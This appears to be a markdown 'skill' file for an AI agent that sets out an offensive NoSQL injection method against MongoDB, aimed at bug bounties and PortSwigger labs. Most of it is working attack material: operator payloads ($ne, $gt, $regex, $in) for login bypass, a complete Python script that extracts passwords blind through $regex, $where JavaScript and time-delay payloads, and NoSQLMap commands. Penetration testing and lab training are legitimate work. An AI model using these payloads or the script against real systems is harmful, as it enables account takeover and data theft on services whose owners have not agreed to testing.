---
name: nosql-injection
description: "NoSQL injection methodology for MongoDB (primary) and other NoSQL databases. Covers: operator injection ($ne, $gt, $regex, $exists, $where), authentication bypass via JSON and form-urlencoded parameters, blind data extraction via regex enumeration, $where JavaScript injection, NoSQLMap tool usage. High-tier bounty ceiling (auth bypass, data exfil). 4 PortSwigger labs."
trigger_keywords: "nosql injection, nosql, mongodb injection, mongodb operator, operator injection, dollar ne, $ne, $gt, $regex, $where, $exists, nosqlmap, mongodb auth bypass, no sql, no-sql injection, json injection, operator abuse, bson injection"
version: 1.0
created: 2026-02-25
owner: cyber-operator
---

# NoSQL Injection (MongoDB)

## Purpose

Exploit MongoDB's JSON query language by injecting operators into user-controlled parameters. Auth bypass and blind data extraction. 4 PortSwigger labs. High bounty ceiling.

---

## Operator Injection — Authentication Bypass

### JSON Body Injection

```http
# Normal login
POST /api/login HTTP/1.1
Content-Type: application/json
{"username": "admin", "password": "test123"}

# $ne injection (password ≠ empty string → matches any non-empty password)
{"username": "admin", "password": {"$ne": ""}}

# Other operators:
{"username": "admin", "password": {"$gt": ""}}
{"username": "admin", "password": {"$regex": ".*"}}
{"username": "admin", "password": {"$exists": true}}
{"username": {"$in": ["admin", "root", "administrator"]}, "password": {"$ne": ""}}
```

### Form URL-Encoded Injection (qs library bracket notation)

```
# Normal: username=admin&password=test
# Injection: username=admin&password[$ne]=
# App receives: {username: "admin", password: {$ne: ""}}

# Other variations:
username=admin&password[$gt]=
username=admin&password[$regex]=.*
username[$in][0]=admin&username[$in][1]=root&password[$ne]=
```

---

## Blind Data Extraction via $regex

```python
import requests
import string

password = ""
chars = string.ascii_letters + string.digits + string.punctuation

for position in range(50):
    found = False
    for char in chars:
        # Escape regex special chars
        escaped = char
        if char in r'\.^$*+?{}[]|()':
            escaped = '\\' + char

        payload = {
            "username": "admin",
            "password[$regex]": f"^{password}{escaped}"
        }

        response = requests.post("https://target.com/api/login", data=payload)

        if "Welcome" in response.text or response.status_code == 200:
            password += char
            print(f"Found: {password}")
            found = True
            break

    if not found:
        break

print(f"Password: {password}")
```

---

## $where JavaScript Injection (when enabled)

```json
// Authentication bypass
{"username": "admin", "$where": "this.password.length > 0"}

// Time-based extraction
{"username": "admin", "$where": "if(this.password[0]=='a'){sleep(5000);return true;}return false;"}

// Check if $where is enabled (benign probe):
{"username": "admin", "$where": "return true;"}
```

---

## Tool: NoSQLMap

```bash
git clone https://github.com/codingo/NoSQLMap.git
cd NoSQLMap
python setup.py install

# Usage
python nosqlmap.py -u "https://target.com/api/login" -p username,password
```

---

## Burp Manual Testing Workflow

1. Capture login request in Burp Repeater
2. If JSON body: Replace string values with operator objects (`{"$ne":""}`)
3. If form body: Add bracket notation (`parameter[$ne]=`)
4. Monitor: response length change, status code change, response content change
5. Confirm bypass: look for session cookie set, redirect to dashboard, or user data in response

---

## Other NoSQL Databases

| DB | Injection Pattern |
|---|---|
| CouchDB | JSON operators in `_find` selectors: `$gt`, `$lt`, `$regex` |
| Redis | `EVAL` command for Lua injection, key enumeration via `KEYS *` pattern |
| Cassandra | CQL injection similar to SQL but limited subqueries |

---

## Evidence Standards

- Auth bypass: Screenshot showing login successful with `{"$ne":""}` injection. Include before/after status codes.
- Blind extraction: Show the Python script and extracted data (non-sensitive, e.g., password length or first char).
- $where JS injection: Show time-delay response proving execution.

*nosql-injection.md v1.0 | owner: cyber-operator | 2026-02-25*
